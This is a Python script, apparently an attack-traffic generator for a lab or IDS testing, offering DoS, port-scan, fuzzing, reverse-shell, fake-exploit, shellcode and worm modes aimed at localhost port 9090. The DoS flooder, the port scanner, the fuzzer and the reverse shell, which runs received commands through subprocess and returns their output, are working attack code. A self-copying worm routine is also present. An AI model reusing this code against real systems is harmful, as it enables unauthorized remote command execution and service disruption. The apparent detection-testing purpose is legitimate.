import socket
import threading
import random
import os
import time
from scapy.all import *
import subprocess

# === ATTACK SELECTOR ===
# Change this to: Recon, Fuzzer, Backdoor, Exploit, Shellcode, Worm, DoS


# Common configuration
TARGET_IP = "127.0.0.1"
TARGET_PORT = 9090   # 🚀 Attack will happen on 9090 everywhere!

# === DoS Attack ===
attack_type = "Recon"

def simulate_dos(target=TARGET_IP, port=TARGET_PORT):
    def attack():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.send(b"GET / HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n")
                s.close()
            except:
                pass

    print("[*] Launching DoS Attack on port", port)
    for _ in range(200):
        threading.Thread(target=attack).start()

# === Reconnaissance ===


def simulate_recon(target=TARGET_IP, port_range=(1, 10000)):
    print(
        f"[*] Starting full reconnaissance scan on {target} ports {port_range[0]}-{port_range[1]}")
    open_ports = []

    for port in range(port_range[0], port_range[1] + 1):
        try:
            s = socket.socket()
            s.settimeout(0.05)  # Short timeout for faster scan
            s.connect((target, port))
            open_ports.append(port)
            s.close()
        except:
            pass  # Port is closed or unreachable

    if open_ports:
        print(f"[+] Open ports on {target}: {open_ports}")
    else:
        print("[-] No open ports found.")

# === Fuzzer ===


def simulate_fuzzer(target=TARGET_IP, port=TARGET_PORT):
    print("[*] Fuzzing HTTP server on port", port)
    for _ in range(100):
        payload = "A" * random.randint(100, 1000)
        try:
            s = socket.socket()
            s.connect((target, port))
            s.send(f"GET /{payload} HTTP/1.1\r\nHost: fuzz\r\n\r\n".encode())
            s.close()
        except:
            pass

# === Backdoor (Reverse Shell to Attacker VM) ===


def simulate_backdoor(attacker_ip=TARGET_IP, port=TARGET_PORT):
    print("[*] Trying to connect back to attacker on port", port)
    s = socket.socket()
    try:
        s.connect((attacker_ip, port))
        while True:
            command = s.recv(1024).decode()
            if command.lower() == "exit":
                break
            output = subprocess.getoutput(command)
            s.send(output.encode())
    except Exception as e:
        print(f"[!] Failed to connect for reverse shell: {e}")

# === Exploit Simulation (Fake buffer overflow) ===


def simulate_exploit():
    print("[*] Simulating fake buffer overflow exploit...")
    buffer = b"A" * 1024 + b"\x90" * 16 + b"FAKE_SHELLCODE"
    print(f"[+] Crafted exploit payload (size={len(buffer)} bytes): {buffer}")

# === Shellcode Simulation (No real code execution) ===


def simulate_shellcode():
    print("[*] Simulating shellcode injection...")
    shellcode = b"\x90" * 100 + b"\xcc" * 4  # NOP sled + int3
    print(f"[+] Simulated shellcode bytes: {shellcode}")

# === Worm Simulation (Self-replication) ===


def simulate_worm():
    print("[*] Simulating worm replication across folders...")
    worm_code = __file__
    target_dirs = [f"./infected_folder_{i}" for i in range(3)]
    for d in target_dirs:
        os.makedirs(d, exist_ok=True)
        target_file = os.path.join(d, "worm_copy.py")
        with open(worm_code, "r") as src, open(target_file, "w") as dst:
            dst.write(src.read())
        print(f"[+] Worm copied to {target_file}")



if __name__ == "__main__":

    # === Dispatcher ===
    attack_dispatcher = {
        "DoS": simulate_dos,
        "Recon": simulate_recon,
        "Fuzzer": simulate_fuzzer,
        "Backdoor": simulate_backdoor,
        "Exploit": simulate_exploit,
        "Shellcode": simulate_shellcode,
        "Worm": simulate_worm,
    }

    # === Attack Execution ===
    if attack_type in attack_dispatcher:
        if attack_type == "Recon":
            # Updated here to include 9090
            attack_dispatcher[attack_type](port_range=(1, 10000))
        else:
            attack_dispatcher[attack_type]()
    else:
        print(f"[!] Invalid attack type: {attack_type}")